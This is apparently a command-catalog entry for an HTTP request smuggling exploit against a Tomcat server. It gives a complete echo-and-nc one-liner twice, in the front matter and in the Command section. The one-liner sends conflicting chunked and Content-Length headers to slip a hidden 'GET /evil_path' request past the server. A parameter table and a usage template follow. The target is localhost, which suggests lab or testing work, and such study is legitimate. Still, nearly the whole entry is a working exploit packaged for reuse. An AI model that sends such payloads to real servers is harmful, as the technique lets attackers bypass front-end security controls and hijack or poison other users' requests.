---
data: >-
  echo -n 'POST /benign_path HTTP/1.1\r\nHost: a.com\r\nConnection:
  keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n5\r\n12345\r\n0\r\nContent:
  hello\r\na\r\n\r\nPOST /benign_path HTTP/1.1\r\nHost: a.com\r\nConnection:
  keep-alive\r\nContent-Length: 37\r\n\r\nGET /evil_path HTTP/1.1\r\nAny:
  any\r\nHost: b.com\r\n\r\n' | nc 127.0.0.1 43022
tags:
  - payload
  - network
type: command
executor: bash
platforms:
  - Linux
id: 55ff92fb-f0da-488a-af53-bc65c50840c6
created_at: '2025-12-13T09:01:22.407Z'
updated_at: '2025-12-13T09:01:22.407Z'
verified: false
validated: true
submitted: true
---
# echo-nc-send-smuggling-payload

## Command

```bash
echo -n 'POST /benign_path HTTP/1.1\r\nHost: a.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n5\r\n12345\r\n0\r\nContent: hello\r\na\r\n\r\nPOST /benign_path HTTP/1.1\r\nHost: a.com\r\nConnection: keep-alive\r\nContent-Length: 37\r\n\r\nGET /evil_path HTTP/1.1\r\nAny: any\r\nHost: b.com\r\n\r\n' | nc 127.0.0.1 43022
```

## Description

Generates and sends a crafted HTTP payload exploiting the request smuggling vulnerability to the Tomcat server on localhost port 43022, used to exploit the vulnerability by sending a smuggled request.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-n` | Do not output trailing newline | Yes |
| `|` | Pipe output to nc | Yes |
| `nc 127.0.0.1 43022` | Connect to localhost on port 43022 and send data | Yes |

## Examples

### Basic Usage

```bash
echo -n '[payload]' | nc 127.0.0.1 43022
```

## Expected Output

HTTP responses from the server, but in context, it's to trigger the smuggling without direct output shown.

## Related

- [[procedures/Send-Crafted-HTTP-Request-Smuggling-Payload]]
- [[tools/echo]]
- [[tools/nc]]
